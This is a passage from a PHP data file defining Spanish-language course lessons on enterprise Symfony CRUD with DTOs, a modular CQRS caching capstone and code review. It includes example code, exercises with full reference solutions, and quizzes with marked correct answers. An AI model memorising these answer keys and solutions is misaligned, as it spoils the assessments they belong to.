                                'b' => 'Es el nivel más estricto de análisis de tipos: prohíbe el uso de tipos mixed no documentados y obliga a manejar explícitamente posibles valores null antes de invocar cualquier método o propiedad.',
                                'c' => 'Obliga a usar bases de datos NoSQL.',
                                'd' => 'Desactiva el recolector de basura en CI.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'PHPStan Nivel 9 no perdona ambigüedades de tipo: cualquier valor potencialmente null o mixed debe ser verificado con guard clauses o aserciones de tipo antes de su uso, eliminando errores en tiempo de ejecución.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cómo acelera actions/cache con el hash de composer.lock la ejecución de pipelines en GitHub Actions?',
                            'options' => [
                                'a' => 'Aumenta la memoria RAM de los runners a 128GB.',
                                'b' => 'Almacena y reutiliza la carpeta vendor descargada; si composer.lock no ha cambiado entre commits, la descarga e instalación de paquetes se omite por completo, restaurando las dependencias en pocos segundos.',
                                'c' => 'Compila el código de PHP a código C automáticamente.',
                                'd' => 'Desactiva la suite de pruebas unitarias si el código no cambió.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'La caché vinculada al hash de composer.lock evita repetir descargas pesadas de red y cálculos de resolución de dependencias cuando no hubo cambios en librerías externas.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿En qué consiste un despliegue atómico sin tiempo de inactividad (Zero-Downtime Deployment) para PHP-FPM?',
                            'options' => [
                                'a' => 'En reiniciar el servidor completo cada 5 minutos.',
                                'b' => 'En desplegar el nuevo código en un directorio timestamp aislado (releases/2026...) y conmutar atómicamente un enlace simbólico (current), enviando la señal USR2 a PHP-FPM para que recargue el OpCache sin cortar peticiones en vuelo.',
                                'c' => 'En desactivar Nginx durante 30 segundos.',
                                'd' => 'En borrar la base de datos y recrearla en cada commit.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'El enlace simbólico conmuta de forma instantánea y atómica. La señal USR2 indica a PHP-FPM que inicie nuevos procesos worker con el código nuevo mientras los procesos anteriores terminan sus peticiones activas sin interrupción.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 15: LECCIÓN 1: Proyecto 1: CRUD Enterprise con DTOs & Validation
            // ==========================================
            'project-01-senior-crud' => [
                'slug' => 'project-01-senior-crud',
                'title' => 'Proyecto 1: CRUD Enterprise con DTOs & Validation',
                'module' => 'Proyectos Guiados',
                'minutes' => 120,
                'difficulty' => 'Intermedio',
                'overview' => [
                    'concept' => 'Un CRUD de nivel Enterprise en PHP 8.4 y Symfony 8.1 no tiene nada que ver con ejemplos simplistas donde el controlador instancia una entidad Doctrine directamente. En una arquitectura profesional, el flujo de mutación está rígidamente estratificado: 1) Deserialización a un DTO inmutable fuertemente tipado (CreateProductDto); 2) Validación declarativa con Symfony Validator mediante atributos nativos; 3) Mapeador desacoplado (Data Mapper) que transforma el DTO a la entidad respetando sus invariantes encapsuladas; 4) Capa de persistencia aislada a través de un Repositorio específico; 5) Proyección del resultado a un DTO de respuesta inmutable (ProductResponseDto) para no exponer el modelo ORM interno.',
                    'problem' => 'El antipatrón del "CRUD Anémico y Fuga de Dominio": entidades Doctrine expuestas directamente como entrada y salida de endpoints HTTP. Los desarrolladores atan el esquema de la base de datos al contrato público de la API. Un atacante puede enviar campos no previstos (Mass Assignment Vulnerability, como isAdmin: true o discount: 99) que Doctrine persiste automáticamente. Además, la lógica de validación se dispersa entre JavaScript y controladores, provocando corrupción silenciosa de datos.',
                    'solution' => 'Arquitectura Desacoplada de Entrada/Salida con DTOs y Mappers: DTOs inmutables con tipos estrictos que encapsulan la carga útil HTTP; inyección de ValidatorInterface para validación declarativa con RFC 7807 (Problem Details); entidades de dominio ricas con constructores semánticos y sin setters públicos indiscriminados; y DTOs de salida que exponen solo los campos autorizados.',
                    'problem_label' => 'El Antipatrón del CRUD Anémico y la Exposición Directa de Entidades:',
                    'solution_label' => 'La Solución: CRUD Enterprise con DTOs Inmutables y Validación Estricta:',
                ],
                'internals' => [
                    'title' => 'Flujo de Mutación Enterprise: Del Request HTTP a la Persistencia Segura',
                    'steps' => [
                        [
                            'phase' => '1. Desacoplamiento de Contratos Públicos y Esquemas de Base de Datos',
                            'description' => 'El contrato de la API y el modelo relacional de Doctrine evolucionan a ritmos diferentes. Renombrar una columna o normalizar una tabla en la base de datos jamás debe quebrar las aplicaciones cliente que consumen la API.',
                        ],
                        [
                            'phase' => '2. Validación Declarativa con Atributos de Symfony',
                            'description' => 'El uso de atributos como #[Assert\NotBlank], #[Assert\Positive] o #[Assert\Length] en las propiedades del DTO centraliza las reglas sintácticas y de negocio sin ensuciar la entidad de persistencia ni el controlador.',
                        ],
                        [
                            'phase' => '3. Patrón Data Mapper vs Active Record',
                            'description' => 'El Data Mapper aísla la lógica de conversión entre estructuras de transferencia y objetos de dominio ricos. Evita que la entidad conozca detalles del protocolo HTTP y garantiza que solo se instancien entidades en estados consistentes.',
                        ],
                        [
                            'phase' => '4. Respuestas de Error Estandarizadas con RFC 7807 Problem Details',
                            'description' => 'Cuando la validación del DTO falla, se genera una respuesta HTTP 422 Unprocessable Entity estructurada según RFC 7807 con lista detallada de violaciones, permitiendo a los clientes procesar errores programáticamente.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Projects/EnterpriseCrud/ProductManagementService.php',
                    'title' => 'Servicio de Aplicación Enterprise con DTOs Inmutables y Validación Declarativa',
                    'tag' => 'Enterprise CRUD & DTO Architecture',
                    'code' => "declare(strict_types=1);

namespace App\Projects\EnterpriseCrud;

use Symfony\Component\Validator\Validator\ValidatorInterface;
use Symfony\Component\Validator\Constraints as Assert;
use InvalidArgumentException;

readonly class CreateProductDto
{
    public function __construct(
        #[Assert\NotBlank(message: 'El SKU del producto es obligatorio.')]
        public string \$sku,

        #[Assert\NotBlank(message: 'El nombre del producto es obligatorio.')]
        #[Assert\Length(min: 3, max: 120)]
        public string \$name,

        #[Assert\Positive(message: 'El precio debe ser un valor positivo.')]
        public float \$price,

        #[Assert\PositiveOrZero(message: 'El inventario no puede ser negativo.')]
        public int \$stock = 0
    ) {}
}

readonly class ProductResponseDto
{
    public function __construct(
        public int \$id,
        public string \$sku,
        public string \$name,
        public float \$price,
        public int \$stock,
        public string \$createdAt
    ) {}
}

class ProductManagementService
{
    public function __construct(
        private readonly ValidatorInterface \$validator
    ) {}

    /**
     * Valida el DTO y ejecuta la lógica de negocio sin acoplarse al transporte HTTP
     *
     * @return array{success: bool, product: ?ProductResponseDto, errors: list<string>}
     */
    public function createProduct(CreateProductDto \$dto): array
    {
        \$violations = \$this->validator->validate(\$dto);
        if (count(\$violations) > 0) {
            \$errors = [];
            foreach (\$violations as \$violation) {
                \$errors[] = sprintf('%s: %s', \$violation->getPropertyPath(), \$violation->getMessage());
            }

            return ['success' => false, 'product' => null, 'errors' => \$errors];
        }

        // Simulación de persistencia de la entidad de dominio
        \$response = new ProductResponseDto(
            id: mt_rand(100, 999),
            sku: strtoupper(trim(\$dto->sku)),
            name: trim(\$dto->name),
            price: \$dto->price,
            stock: \$dto->stock,
            createdAt: date('Y-m-d H:i:s')
        );

        return ['success' => true, 'product' => \$response, 'errors' => []];
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Para un Senior, un CRUD no es una tarea menor o "aburrida", sino la prueba de fuego de la higiene arquitectónica de un sistema. La regla de oro: "Las entidades de base de datos nunca cruzan el límite del controlador hacia el exterior, y los datos HTTP nunca tocan una entidad sin pasar primero por un DTO inmutable y un validador estricto". El modelo de dominio es sagrado y debe permanecer protegido de las fluctuaciones de la API.',
                    'critical_questions' => [
                        '¿Estamos usando DTOs inmutables (readonly classes) para evitar mutaciones accidentales durante el Request?',
                        '¿Existe alguna entidad Doctrine expuesta directamente en respuestas JSON que pueda filtrar datos sensibles como passwords o tokens?',
                        '¿Se devuelven los errores de validación formateados según el estándar RFC 7807 (Problem Details)?',
                        '¿Tiene la entidad de dominio constructores privados o semánticos para evitar instanciaciones en estados corruptos?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Crear un endpoint para registrar nuevos usuarios con datos de perfil y rol inicial.',
                    'junior' => [
                        'approach' => 'Recibe el Request, hace $user = new User(), asigna $user->setRoles($request->get("roles")) y llama a $em->flush().',
                        'flaws' => [
                            'Vulnerabilidad crítica de Mass Assignment: cualquier usuario puede enviarse a sí mismo el rol ROLE_SUPER_ADMIN.',
                            'Si la base de datos cambia un campo de User, la API rompe a todos los clientes móviles.',
                            'Las entidades quedan en estados inconsistentes si faltan campos obligatorios.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Deserializa a RegisterUserDto que solo expone campos autorizados (email, name, password). Valida con Symfony Validator, mapea a entidad mediante User::register() que asigna ROLE_USER por defecto, y retorna UserResponseDto.',
                        'rationale' => [
                            'Imposible escalar privilegios por Mass Assignment: el DTO no contiene el campo roles.',
                            'Invariantes de negocio protegidas: la entidad nace válida y consistente.',
                            'Contrato de API estable e independiente del esquema relacional.',
                        ],
                        'trade_offs' => 'Requiere escribir clases DTO y mappers adicionales.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación de EnterpriseDtoValidator',
                    'objective' => 'Implementar la clase EnterpriseDtoValidator que inspeccione un objeto DTO mediante reflexión, valide que campos de texto no estén vacíos, que campos numéricos con nombres clave (price, amount, quantity) sean positivos (> 0), y que campos con "email" tengan formato de correo válido.',
                    'instructions' => 'Completa EnterpriseDtoValidator: implementa validateDto(object $dto): array. Valida que el objeto no sea nulo. Inspecciona las propiedades públicas del DTO. Si una propiedad de tipo string está vacía tras trim(), añade error "$prop no puede estar vacío". Si una propiedad numérica cuyo nombre contenga "price", "amount" o "quantity" es <= 0, añade error "$prop debe ser positivo". Si una propiedad string contiene "email" en su nombre y no cumple filter_var($val, FILTER_VALIDATE_EMAIL), añade error "$prop tiene formato inválido". Si hay errores, retorna [is_valid => false, errors => $errors]; si no hay errores, retorna [is_valid => true, errors => []]. Implementa reset(): void.',
                    'filename' => 'EnterpriseDtoValidator.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Projects\\EnterpriseCrud;\n\nuse ReflectionClass;\nuse ReflectionProperty;\n\nclass EnterpriseDtoValidator\n{\n    /**\n     * @return array{is_valid: bool, errors: list<string>}\n     */\n    public function validateDto(object \$dto): array\n    {\n        // TODO: Inspeccionar propiedades públicas del DTO mediante ReflectionClass\n        // TODO: Validar strings no vacíos\n        // TODO: Validar valores numéricos positivos para propiedades de precio/monto/cantidad\n        // TODO: Validar formato de email para propiedades con 'email'\n        // TODO: Retornar array estructurado con is_valid y errors\n        return [\n            'is_valid' => false,\n            'errors' => ['Validación no implementada.'],\n        ];\n    }\n\n    public function reset(): void\n    {\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Projects\\EnterpriseCrud;\n\nuse ReflectionClass;\nuse ReflectionProperty;\n\nclass EnterpriseDtoValidator\n{\n    /**\n     * @return array{is_valid: bool, errors: list<string>}\n     */\n    public function validateDto(object \$dto): array\n    {\n        \$reflection = new ReflectionClass(\$dto);\n        \$properties = \$reflection->getProperties(ReflectionProperty::IS_PUBLIC);\n\n        \$errors = [];\n\n        foreach (\$properties as \$property) {\n            \$name = \$property->getName();\n            \$value = \$property->getValue(\$dto);\n\n            if (is_string(\$value)) {\n                if (trim(\$value) === '') {\n                    \$errors[] = sprintf('El campo \"%s\" no puede estar vacío.', \$name);\n                    continue;\n                }\n\n                if (str_contains(strtolower(\$name), 'email') && !filter_var(\$value, FILTER_VALIDATE_EMAIL)) {\n                    \$errors[] = sprintf('El campo \"%s\" tiene un formato de correo electrónico inválido.', \$name);\n                }\n            } elseif (is_int(\$value) || is_float(\$value)) {\n                \$lowerName = strtolower(\$name);\n                if ((str_contains(\$lowerName, 'price') || str_contains(\$lowerName, 'amount') || str_contains(\$lowerName, 'quantity')) && \$value <= 0) {\n                    \$errors[] = sprintf('El campo \"%s\" debe tener un valor numérico estrictamente positivo.', \$name);\n                }\n            }\n        }\n\n        return [\n            'is_valid' => count(\$errors) === 0,\n            'errors' => \$errors,\n        ];\n    }\n\n    public function reset(): void\n    {\n    }\n}\n",
                    'explanation' => 'La validación automática por reflexión permite verificar invariantes de DTOs sin acoplarse a librerías externas o frameworks específicos, garantizando que ningún dato corrupto ingrese a la capa de servicios o entidades de dominio.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: CRUD Enterprise con DTOs & Validation',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Por qué la práctica de hidratar directamente entidades Doctrine con los datos crudos del Request HTTP ($request->request->all()) es una vulnerabilidad crítica de Mass Assignment?',
                            'options' => [
                                'a' => 'Porque hace que el servidor consuma toda la memoria RAM en 2 segundos.',
                                'b' => 'Porque un atacante puede inyectar propiedades no previstas en el formulario (como isAdmin: true, balance: 10000 o status: active) y Doctrine las persistirá directamente en la base de datos si la entidad tiene setters o hidratación genérica.',
                                'c' => 'Porque Symfony no compila si se usa el objeto Request.',
                                'd' => 'Porque MySQL prohíbe consultas que tengan más de 3 parámetros.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Exponer la entidad como receptor directo de datos HTTP abre la puerta a escalada de privilegios y corrupción de datos. Los DTOs inmutables con campos explícitos neutralizan de raíz este vector de ataque.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es la ventaja de utilizar readonly classes de PHP 8.2+ para implementar DTOs de entrada y salida?',
                            'options' => [
                                'a' => 'Garantiza inmutabilidad estricta: una vez instanciado el DTO, ninguna propiedad puede ser alterada en capas intermedias, eliminando efectos secundarios y asegurando que los datos validados permanezcan intactos.',
                                'b' => 'Permite guardar el DTO en el disco duro automáticamente.',
                                'c' => 'Hace que el DTO sea invisible para el recolector de basura.',
                                'd' => 'Obliga a que el DTO se ejecute en un hilo separado de CPU.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Con readonly class, todas las propiedades son inmutables por diseño. Esto proporciona predictibilidad absoluta entre la validación y la persistencia sin temor a que algún servicio modifique los valores.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué define el estándar RFC 7807 (Problem Details for HTTP APIs)?',
                            'options' => [
                                'a' => 'Un formato estandarizado JSON (application/problem+json) para reportar errores de APIs HTTP con campos predecibles como type, title, status, detail y violaciones específicas.',
                                'b' => 'El tamaño máximo de paquetes TCP en Nginx.',
                                'c' => 'La versión de PHP obligatoria para producción.',
                                'd' => 'Un protocolo de compresión de imágenes WebP.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'RFC 7807 elimina las respuestas de error caóticas en APIs REST, ofreciendo a los clientes un formato estandarizado y tipado para procesar fallos de validación con precisión.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 15: LECCIÓN 2: Proyecto Final: Arquitectura Modular & Caching
            // ==========================================
            'project-07-capstone-distributed' => [
                'slug' => 'project-07-capstone-distributed',
                'title' => 'Proyecto Final: Arquitectura Modular & Caching',
                'module' => 'Proyectos Guiados',
                'minutes' => 240,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'El Proyecto Capstone representa la culminación integral del currículum de Senior PHP Developer. Sintetiza todos los conceptos dominados a lo largo de las 20 fases previas: Arquitectura Hexagonal y Domain-Driven Design pragmático, segregación de responsabilidades con CQRS ligero (Command-Query Responsibility Segregation), comunicación asíncrona respaldada por Symfony Messenger y Redis Streams, caching distribuido multinivel (L1 en memoria estática de proceso + L2 en Redis con invalidación probabilística), resiliencia con Circuit Breakers y observabilidad continua con métricas de alta precisión en nanosegundos (hrtime).',
                    'problem' => 'El antipatrón del "Monolito Espagueti Ingobernable": sistemas donde los módulos de facturación, usuarios, catálogo e inventario están acoplados directamente mediante dependencias cruzadas entre servicios y consultas SQL gigantescas con 12 JOINs. Cualquier cambio en la tabla de usuarios rompe el cálculo de impuestos, las caídas de pasarelas de pago bloquean el renderizado del catálogo y la base de datos colapsa ante la primera campaña publicitaria.',
                    'solution' => 'Arquitectura Modular Desacoplada con Event-Driven Caching: 1) Micro-Modularidad en Symfony mediante Bounded Contexts que se comunican exclusivamente por contratos y eventos; 2) CQRS Ligero para separar escrituras transaccionales ACID en MySQL de lecturas denormalizadas en Redis (< 2ms); 3) Caching Distribuido Quirúrgico con invalidación basada en eventos de dominio; 4) Resiliencia con Circuit Breakers y colas de contingencia con Dead Letter Queues.',
                    'problem_label' => 'El Antipatrón del Monolito Espagueti Altamente Acoplado:',
                    'solution_label' => 'La Solución: Monolito Modular Desacoplado con Event-Driven Caching y CQRS:',
                ],
                'internals' => [
                    'title' => 'Arquitectura del Capstone: Micro-Modularidad, Eventos de Dominio y Cache Distribuido',
                    'steps' => [
                        [
                            'phase' => '1. Bounded Contexts y Contratos Intermodulares',
                            'description' => 'Cada módulo de dominio (Billing, Catalog, Orders) es autónomo. No importa directamente entidades de otros módulos; la interacción se realiza mediante Interfaces de Servicio y DTOs de integración, impidiendo dependencias cíclicas.',
                        ],
                        [
                            'phase' => '2. CQRS Ligero: Separación de Flujos de Comando y Consulta',
                            'description' => 'Las mutaciones de estado se procesan mediante Commands transaccionales en MySQL, mientras que las consultas de lectura pesadas se resuelven contra proyecciones optimizadas en Redis en tiempo sub-milisegundo.',
                        ],
                        [
                            'phase' => '3. Invalidación de Caché Basada en Eventos de Dominio',
                            'description' => 'Cuando se publica el evento ProductPriceChangedEvent, un listener especializado invalida exclusivamente las claves de caché afectadas en Redis, erradicando lecturas obsoletas sin recurrir a costosas purgas globales de caché.',
                        ],
                        [
                            'phase' => '4. Resiliencia con Circuit Breakers y Supervisión de Fallos',
                            'description' => 'Todas las integraciones con servicios externos (pasarelas de pago, APIs logísticas) están protegidas por Circuit Breakers que conmutan automáticamente a degradación elegante cuando la tasa de fallo supera el umbral configurado.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Projects/Capstone/DistributedSystemCoordinator.php',
                    'title' => 'Coordinador Central de Arquitectura Modular con CQRS y Cache Distribuido',
                    'tag' => 'Capstone Distributed Coordinator & CQRS',
                    'code' => "declare(strict_types=1);

namespace App\Projects\Capstone;

use RuntimeException;
use Closure;

class DistributedSystemCoordinator
{
    /**
     * @var array<string, object>
     */
    private array \$modules = [];

    /**
     * @var array<string, array{value: mixed, expires_at: float}>
     */
    private array \$distributedCache = [];

    public function registerModule(string \$name, object \$moduleService): void
    {
        \$cleanName = trim(\$name);
        if (\$cleanName === '') {
            throw new RuntimeException('El nombre del módulo no puede estar vacío.');
        }

        \$this->modules[\$cleanName] = \$moduleService;
    }

    /**
     * Ejecuta una consulta optimizada con lectura en caché distribuida L2 (CQRS Query)
     */
    public function executeQuery(string \$cacheKey, int \$ttlSeconds, Closure \$dataFetcher): mixed
    {
        \$now = microtime(true);

        if (isset(\$this->distributedCache[\$cacheKey])) {
            \$item = \$this->distributedCache[\$cacheKey];
            if (\$now < \$item['expires_at']) {
                return \$item['value'];
            }
            unset(\$this->distributedCache[\$cacheKey]);
        }

        \$freshData = \$dataFetcher();

        \$this->distributedCache[\$cacheKey] = [
            'value' => \$freshData,
            'expires_at' => \$now + (float) \$ttlSeconds,
        ];

        return \$freshData;
    }

    /**
     * Ejecuta un comando mutacional con invalidación quirúrgica de caché (CQRS Command)
     *
     * @param list<string> \$cacheKeysToInvalidate
     */
    public function executeCommand(string \$module, string \$method, array \$args, array \$cacheKeysToInvalidate = []): mixed
    {
        if (!isset(\$this->modules[\$module])) {
            throw new RuntimeException(sprintf('Módulo \"%s\" no registrado en el coordinador.', \$module));
        }

        \$handler = \$this->modules[\$module];
        if (!method_exists(\$handler, \$method)) {
            throw new RuntimeException(sprintf('El método \"%s\" no existe en el módulo \"%s\".', \$method, \$module));
        }

        \$result = \$handler->\$method(...\$args);

        // Invalidación reactiva de claves de caché vinculadas al comando
        foreach (\$cacheKeysToInvalidate as \$key) {
            unset(\$this->distributedCache[\$key]);
        }

        return \$result;
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Para un Senior Staff / Principal Engineer, la arquitectura no se mide por cuántos patrones o librerías de moda incorpora, sino por su simplicidad, resiliencia y desacoplamiento. El verdadero logro de un Senior es diseñar un sistema donde cualquier módulo pueda fallar, entrar en mantenimiento o escalar de forma independiente sin poner en peligro la continuidad del negocio.',
                    'critical_questions' => [
                        '¿Están los Bounded Contexts completamente desacoplados sin consultas SQL que hagan JOINs entre tablas de diferentes dominios?',
                        '¿Se utiliza CQRS para evitar que consultas complejas de lectura bloqueen las tablas transaccionales de escritura?',
                        '¿Es la invalidación de caché quirúrgica y guiada por eventos en lugar de usar TTLs cortos arbitrarios?',
                        '¿Cuenta el sistema con degradación elegante cuando un servicio dependiente externo no responde en tiempo y forma?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Diseñar una plataforma de alta escala para ventas internacionales de comercio electrónico.',
                    'junior' => [
                        'approach' => 'Divide todo inmediatamente en 15 microservicios con gRPC y Docker, bases de datos separadas para cada servicio y llamadas HTTP síncronas entre ellos.',
                        'flaws' => [
                            'Latencia acumulativa en cascada: cada petición pasa por 8 microservicios síncronos tardando 3 segundos.',
                            'Pérdida de consistencia: transacciones distribuidas complejas que dejan órdenes a medio cobrar.',
                            'Sobrecarga operativa monumental para un equipo pequeño.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Construye un Monolito Modular con fronteras de dominio claras, eventos en memoria con Symfony EventDispatcher y Messenger, CQRS ligero con caché en Redis y Circuit Breakers para pagos externos.',
                        'rationale' => [
                            'Latencia sub-milisegundo para lecturas de catálogo desde Redis.',
                            'Despliegue unificado sin la pesadilla operativa de orquestar 15 servicios independientes.',
                            'Evolución fluida: si un módulo requiere escalamiento independiente en el futuro, ya está completamente desacoplado por sus interfaces.',
                        ],
                        'trade_offs' => 'Requiere disciplina para no violar las fronteras de los módulos dentro del mismo repositorio.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación de DistributedModularBus',
                    'objective' => 'Implementar la clase DistributedModularBus para orquestar la comunicación entre módulos desacoplados mediante registro dinámico de handlers, despacho de comandos con captura de excepciones, y verificación de existencia de módulos.',
                    'instructions' => 'Completa DistributedModularBus: implementa registerModule(string $moduleName, object $handler): void. Valida que $moduleName (tras trim) no sea vacío (InvalidArgumentException) y guarda el handler. Implementa dispatchCommand(string $moduleName, string $action, array $payload): array: valida que el módulo exista (lanza RuntimeException si no); invoca la acción dinámicamente si el método existe en el handler o lanza RuntimeException si no existe; captura cualquier Throwable y retorna [status => "error", module => $moduleName, action => $action, error => $e->getMessage()]; si tiene éxito, retorna [status => "success", module => $moduleName, action => $action, result => $result, timestamp => microtime(true)]. Implementa hasModule(string $moduleName): bool y reset(): void.',
                    'filename' => 'DistributedModularBus.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Projects\\Capstone;\n\nuse InvalidArgumentException;\nuse RuntimeException;\nuse Throwable;\n\nclass DistributedModularBus\n{\n    /**\n     * @var array<string, object>\n     */\n    private array \$modules = [];\n\n    public function registerModule(string \$moduleName, object \$handler): void\n    {\n        // TODO: Validar que \$moduleName no esté vacío (InvalidArgumentException)\n        // TODO: Almacenar en \$this->modules\n    }\n\n    /**\n     * @param array<string, mixed> \$payload\n     * @return array{status: string, module: string, action: string, result?: mixed, error?: string, timestamp?: float}\n     */\n    public function dispatchCommand(string \$moduleName, string \$action, array \$payload): array\n    {\n        // TODO: Validar que el módulo exista (RuntimeException si no)\n        // TODO: Invocar \$handler->\$action(\$payload) de forma dinámica capturando Throwable\n        // TODO: Retornar array estructurado con status, module, action y result o error\n        return [\n            'status' => 'error',\n            'module' => \$moduleName,\n            'action' => \$action,\n            'error' => 'No implementado',\n        ];\n    }\n\n    public function hasModule(string \$moduleName): bool\n    {\n        return isset(\$this->modules[trim(\$moduleName)]);\n    }\n\n    public function reset(): void\n    {\n        \$this->modules = [];\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Projects\\Capstone;\n\nuse InvalidArgumentException;\nuse RuntimeException;\nuse Throwable;\n\nclass DistributedModularBus\n{\n    /**\n     * @var array<string, object>\n     */\n    private array \$modules = [];\n\n    public function registerModule(string \$moduleName, object \$handler): void\n    {\n        \$clean = trim(\$moduleName);\n        if (\$clean === '') {\n            throw new InvalidArgumentException('El nombre del módulo no puede estar vacío.');\n        }\n\n        \$this->modules[\$clean] = \$handler;\n    }\n\n    /**\n     * @param array<string, mixed> \$payload\n     * @return array{status: string, module: string, action: string, result?: mixed, error?: string, timestamp?: float}\n     */\n    public function dispatchCommand(string \$moduleName, string \$action, array \$payload): array\n    {\n        \$cleanModule = trim(\$moduleName);\n        \$cleanAction = trim(\$action);\n\n        if (!isset(\$this->modules[\$cleanModule])) {\n            return [\n                'status' => 'error',\n                'module' => \$cleanModule,\n                'action' => \$cleanAction,\n                'error' => sprintf('Módulo \"%s\" no registrado.', \$cleanModule),\n            ];\n        }\n\n        \$handler = \$this->modules[\$cleanModule];\n\n        if (!method_exists(\$handler, \$cleanAction)) {\n            return [\n                'status' => 'error',\n                'module' => \$cleanModule,\n                'action' => \$cleanAction,\n                'error' => sprintf('La acción \"%s\" no existe en el módulo \"%s\".', \$cleanAction, \$cleanModule),\n            ];\n        }\n\n        try {\n            \$result = \$handler->\$cleanAction(\$payload);\n\n            return [\n                'status' => 'success',\n                'module' => \$cleanModule,\n                'action' => \$cleanAction,\n                'result' => \$result,\n                'timestamp' => microtime(true),\n            ];\n        } catch (Throwable \$e) {\n            return [\n                'status' => 'error',\n                'module' => \$cleanModule,\n                'action' => \$cleanAction,\n                'error' => \$e->getMessage(),\n            ];\n        }\n    }\n\n    public function hasModule(string \$moduleName): bool\n    {\n        return isset(\$this->modules[trim(\$moduleName)]);\n    }\n\n    public function reset(): void\n    {\n        \$this->modules = [];\n    }\n}\n",
                    'explanation' => 'DistributedModularBus permite desacoplar los dominios en un monolito modular, ejecutando comandos a través de contratos dinámicos con captura y aislamiento de errores en cada frontera de módulo.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Arquitectura Modular & Caching Distribuido',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Por qué un Monolito Modular con fronteras de dominio estrictas suele ser superior a una arquitectura de Microservicios prematura para la gran mayoría de proyectos?',
                            'options' => [
                                'a' => 'Porque los microservicios no funcionan con Docker.',
                                'b' => 'Porque mantiene la cohesión de dominio y el desacoplamiento mediante interfaces sin pagar el enorme costo operativo, latencia de red en cascada y complejidad de transacciones distribuidas de los microservicios.',
                                'c' => 'Porque PHP 8.4 solo puede correr en un único servidor.',
                                'd' => 'Porque los microservicios requieren bases de datos en cinta magnética.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Un Monolito Modular proporciona los mismos beneficios de organización de código y separación de responsabilidades que los microservicios, pero con llamadas en memoria (< 1µs), transacciones ACID locales y despliegues unificados y sencillos.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cómo ayuda el patrón CQRS (Command-Query Responsibility Segregation) a resolver problemas de contención en bases de datos de alta concurrencia?',
                            'options' => [
                                'a' => 'Separa el modelo de escritura (Command) transaccional del modelo de lectura (Query), permitiendo que las consultas masivas se resuelvan contra proyecciones desnormalizadas en caché sin bloquear las tablas de escritura transaccional.',
                                'b' => 'Elimina las sentencias SELECT de la aplicación.',
                                'c' => 'Duplica el número de procesadores físicos del servidor.',
                                'd' => 'Desactiva los bloqueos de InnoDB permanentemente.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Al separar las lecturas de las escrituras, las consultas intensivas leen de proyecciones precalculadas en memoria (Redis/Elasticsearch), liberando a la base de datos relacional para procesar exclusivamente mutaciones críticas.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Cuál es el beneficio de la invalidación de caché guiada por eventos de dominio frente a depender exclusivamente de TTLs temporales pasivos?',
                            'options' => [
                                'a' => 'Permite que la caché dure exactamente 100 años.',
                                'b' => 'Garantiza consistencia inmediata: la caché se purga exactamente cuando el estado del dato cambia en el sistema, evitando servir datos obsoletos y eliminando la necesidad de adivinar TTLs arbitrarios.',
                                'c' => 'Reduce el tamaño de la memoria de PHP a cero.',
                                'd' => 'Evita tener que usar Redis en producción.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Con invalidación basada en eventos, los datos pueden tener TTLs muy largos porque el sistema sabe exactamente cuándo un cambio de estado los vuelve obsoletos, logrando una tasa de acierto (Cache Hit Ratio) cercana al 99%.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 16: LECCIÓN 1: Reto: Code Review & Detección de Smells
            // ==========================================
            'eval-senior-code-review' => [
                'slug' => 'eval-senior-code-review',
                'title' => 'Reto: Code Review & Detección de Smells',
                'module' => 'evaluations',
                'minutes' => 45,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'El Code Review a nivel Senior no consiste en buscar discrepancias de estilo visual o indentación (tarea que debe delegarse a herramientas automatizadas de CI como PHP-CS-Fixer o ECS), sino en evaluar la solidez arquitectónica, el respeto a las invariantes de dominio, el impacto en escalabilidad, la seguridad frente a vulnerabilidades y la deuda técnica acumulativa. Un desarrollador Senior actúa como guardián de la mantenibilidad sistémica de la plataforma.',
                    'problem' => 'En muchos equipos de desarrollo, las revisiones de código caen en dos extremos nocivos: la "aprobación ciega" (LGTM sin análisis crítico) o el "nitpicking trivial" (debates interminables sobre comillas simples versus dobles o saltos de línea). Esto permite que fallas graves de diseño —como consultas N+1 encubiertas, flush dentro de ciclos, swallowing de excepciones y fugas de abstracción— lleguen silenciosamente a producción, degradando el rendimiento y la estabilidad.',
                    'problem_label' => 'El Antipatrón del Review Cosmético',
